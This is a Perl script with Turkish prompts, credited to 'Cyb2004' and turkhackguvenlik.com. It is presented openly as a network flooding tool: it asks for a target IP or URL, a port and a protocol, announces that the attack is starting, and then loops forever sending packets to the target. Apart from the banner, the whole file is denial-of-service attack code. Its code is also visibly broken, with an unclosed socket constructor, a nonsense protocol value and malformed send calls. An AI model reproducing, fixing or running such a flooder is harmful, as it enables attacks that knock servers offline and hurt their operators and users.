#!/usr/bin/perl

use IO::Socket;

system("clear || cls");
#Script Banner================================================================
print q{
           
  & & & & & &   &           &   & & & & & &   &      & 
           &           &            &   &               &   &   & 
           &           &            &   & & & & & &   & & 
           &           &            &   & &                 &   & 
           &           & & & & &    &    &              &     & 
         
         &            &     & & & & & &  & & & & &     &      & 
         &            &    &                &  &                   &   & 
         & & & & &     & & & & & &  &                    &&       
         &            &    &               &   &                   &    & 
         &            &    &               &   & & & & &     &       & 
         
         
         & & & & & &    &              &    &                 &    & & & &    & & & & &   &              &      &     & 
         &                      &             &        &            &      &              &           &   &                       &   & 
         &     & & & &    &             &           &       &        & & & &   &           &    &               &     &&
         &                &    &            &              &   &         &              &           &    &               &    &    & 
         & & & & & &     & & & & &                &             & & & &    &          &     & & & &     &   &       & 
  
 [---]   by:> Cyb2004   [---]
 [---]   Version:> V1. 5	     [---]
};
# Ayar ==============================================
print "\n===============================";
print "\n[~] IP Adres & URL Adres: "; # IP Adresi Giriniz Veya URL
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Girilen IP?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "Girilen IP ==> $host";
print "\n===============================";
print "\n[~] IP Port & URL Port: "; # IP Port Veya URL Port Girin;
$port = <STDIN>;
chomp ($port);
while ($port eq ""){ 
 print "   [!] Girilen Port?: ";       
 $port = <STDIN>;
 chomp ($port); 
}
print "Girilen Port ==> $port";
print "\n===============================";
print "\n[~] Mod Secin (TCP & UDP) :"; # Mod Seciniz;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq ""){
 print "   [!] Secilen Port (TCP & UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Secilen Port ==> $proto";
print "\n===============================";
sleep(2);
system("clear || cls");
print "\n[*]www.turkhackguvenlik.com Sisteme Baglaniyor... [$host:$port] proto => [$proto] Attack ( Saldiri ) Basliyor... \n\n";
sleep(3);

{
$sock = IO::Socket::INET->new (
	PeerAddr => $host,
	PeerPort => $port,
	Proto => "Hey! Yazdiniz Sunuculara Tekrar Bakiniz.. ";
}
packets:
while (1) {
$size = rand() * 8921873 * 99919988;
print ("  Packet Sayisi: $size\n");
send($sock, 999999999999999999999999999, $size); 
packets2:
$size = rand() * 8921873 * 99919988 * 2;
print "Flooding:";
send($sock, 999999999999999999999999999, $size);
packet3:
$size = rand() * 8921873 * 99919988 * 2 + 99919988;
print " (=>$host:$port~$proto<=)";
send($sock, $size, $size); # Saldiri Baslama Ani################

}

##############################################################
#####################                #########################
#####################  SCRiPT SONUNA GELDiN #########################
#####################                #########################
##############################################################
#Script ByCyb2004
#www.turkhackguvenlik.com :)
#Baybay... 
